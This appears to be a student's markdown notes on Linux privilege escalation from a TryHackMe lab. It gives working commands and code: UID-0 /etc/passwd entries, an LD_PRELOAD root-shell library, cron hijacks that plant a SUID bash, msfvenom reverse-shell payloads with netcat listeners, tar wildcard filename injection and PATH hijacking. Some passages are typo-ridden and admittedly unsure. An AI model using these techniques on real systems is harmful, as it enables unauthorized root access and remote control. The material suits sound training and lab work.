# Privesec
## Types of Privilege Escalatiopn
There are two main type of privilege escaltion:
- Horizontal: Where you expand your reach by taking over a user with the same permissions as you.
- Vertical: When you try to gain higher privilege access.

![PRIV](/img/tree.png)

## Enumeration
Any good hacker will enumerate to find infromation. But a good hacker also knowns when to be lazy. That is why somebody has written a script for us. Using [this](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) script.
The main ways of getting this is either;
- wget https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
- Open a "python3 -m http.server 8000" and get it from your local machine and once again wget it.
- Just paste it in, make sure to do "chmod +x FILENAME.sh"

## Using SUID/GUID files
The above script will flag any major vulnerabilites on this part. The SUID/GUID is just the permissions of a file. Sometimes it runs as the root user and you can run it or change it. This is a big problem. If you want to manually find these use "find / -perm -u=s -type f 2>/dev/null".

## exploitable pass files

### Exploting writeable passwd files
If you can write to the passwd you can get admin by adding in a couple elements.


test:x:0:0:root:/root:/bin/bash

[as divided by colon (:)]

1.    Username: It is used when user logs in. It should be between 1 and 32 characters in length.
2.    Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
3.    User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
4.    Group ID (GID): The primary group ID (stored in /etc/group file)
5.    User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
6.    Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
7.    Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.



``` 
1. "openssl passwd -1 -salt [salt] [password] or openssl passwd newpasswordhere"
2. new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0 :/root:/bin/bash
```
### /etc/shadow
#### Readable 
If you can read the shadow file you have access to all the users hashes. You can then crack them using johnny.
#### Writable
You can swap out a person's hash with your own. To make a hash use:
```
mkpasswd -m sha-512 newpasswordhere
```


## Sudo - Shell Escape Sequences 
When you do sudo -l you can find out what you can use sudo on. Sometimes the program can be used to get a root shell. To find which programs you can use go onto GTFOBins (https://gtfobins.github.io).

##  Sudo - Environment Variables 
I recommend looking at https://tryhackme.com/room/linuxprivesc. It is much clearer. Sudo can be configured with certain enviromental cariables from user's enviroment. To check which env vars are inherited look for env_keep when running "sudo -l".

Then create a file like "preload.c":
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
After that compile it with:
```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so CFILELOCATION
```
And finally run it like this:
```
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```



## Exploting Crontab
Crontab is a process that scheduled. Often scripts miss this so make sure to llok at this under "/etc/crontab"
It is very usefull to use "locate NAME" to find the script. 

Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job. 
### format
ID

m = Minute

h = Hour

dom = Day of the month

mon = Month

dow = Day of the week

user = What user the command will run as

command = What command should be run

For Example,

hastag  m   h dom mon dow user  command

17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
### Exploting if it is writable
Using msf venom you can generate a script and replace the old file if you have permission. In my case the payload was 'msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R'. you can then replace the file with 'echo 
[MSFVENOM OUTPUT] > autoscript.sh" and set up a listner with "nc -lvnp 8888"


### Exploiting path variableo of crontab
not 100% sure on this one but if the path of the crontab starts with /home/NAMEOFUSERYOUCONTROL and their is a file there is an sh file that they auto run then you can create the roots version of bash?

Create a file called overwrite.sh in your home directory with the following contents:
```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```
Make sure that the file is executable:
```
chmod +x /home/user/overwrite.sh
```
Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
```
/tmp/rootbash -p
```
Remember to remove the modified code, remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!
```
rm /tmp/rootbash
exit
```
### Crontab Jobs - Wildcards
??????
View the contents of the other cron job script:
```
cat /usr/local/bin/compress.sh
```
Note that the tar command is being run with a wildcard (*) in your home directory.

Take a look at the GTFOBins page for tar. Note that tar has command line options that let you run other commands as part of a checkpoint feature.

Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```
Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:
```
chmod +x /home/user/shell.elf
```
Create these two files in /home/user:
```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```
When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
```
nc -nvlp 4444
```
Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:
```
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf
```


## Exploting Path Variables
Lets start off with every command that your file excutes it is done threw a file in /bin. If you change  that you can screw with the commands and change the commands to setup a root console. You can do this if their is an unwritabble root script that you can run and predict the commands. First navigate to a folder like "/tmp" then create a exutable like ls with "echo "/bin/bash" > ls" and then chmod +x ls. You can then change the path variable with "PATH=/tmp:$PATH".

Notes:
- everytime you use ls now then you are going to create a bash terminal. use /bin/ls.
- to reset your path variable use: "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH" i think

## SQL Service Exploit
The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a popular [exploit](https://www.exploit-db.com/exploits/1518) that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.

##


## Using checklists
Checlists help alot. Here is some.
-    https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
-    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
-    https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
-    https://payatu.com/guide-linux-privilege-escalation

